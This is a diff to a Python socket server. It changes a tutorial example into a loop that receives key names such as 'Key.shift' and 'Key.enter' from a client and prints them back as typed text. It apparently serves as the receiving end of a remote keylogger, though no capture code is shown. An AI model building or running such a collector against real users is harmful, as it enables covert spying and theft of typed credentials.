@@ -1,39 +1,47 @@
-# first of all import the socket library 
 import socket			 
 
-# next create a socket object 
-s = socket.socket()		 
+serverSocket = socket.socket()		 
 print ("Socket successfully created")
 
-# reserve a port on your computer in our 
-# case it is 12345 but it can be anything 
 port = 12345			
 
-# Next bind to the port 
-# we have not typed any ip in the ip field 
-# instead we have inputted an empty string 
-# this makes the server listen to requests 
-# coming from other computers on the network 
-s.bind(('', port))		 
-print ("socket binded to %s" %(port)) 
+serverSocket.bind(('', port))		 
+# print ("socket binded to %s" %(port)) 
 
-# put the socket into listening mode 
-s.listen(5)	 
-print ("socket is listening")		 
+serverSocket.listen(5)	 
+print ("socket is listening in " + str(port))		 
 
-# a forever loop until we interrupt it or 
-# an error occurs 
 while True: 
 
-    # Establish connection with client. 
-    c, addr = s.accept()	 
-    print ('Got connection from', addr )
+    clientSocket, clientAddress = serverSocket.accept()	 
+    print ('Got connection from', clientAddress )
+    clientSocket.send('Thank you for connecting'.encode()) 
+    
+    while True: 
+        data = clientSocket.recv(1024)
+        if not data:
+            break
+        data = data.decode('utf-8')
+        data = data.replace("'b'", "")
+        data = data.replace("'", "")
+        
+        if data == "Key.backspace":
+            print('\b' + ' ' + '\b', end="")
+        else: 
+            if data == "Key.shift":
+                data = ""
+            if data == "Key.ctrl_l":
+                data = ""
+            if data == "Key.alt_l":
+                data = ""
+            if data == "Key.tab":
+                data = "\t"
+            if data == "Key.enter":
+                data = "\n"
+            if data == "Key.space":
+                data = "_"
+            print(data, end="")
 
-    # send a thank you message to the client. encoding to send byte type. 
-    c.send('Thank you for connecting'.encode()) 
+    clientSocket.close()
 
-    # Close the connection with the client 
-    c.close()
-
-    # Breaking once connection closed
     break
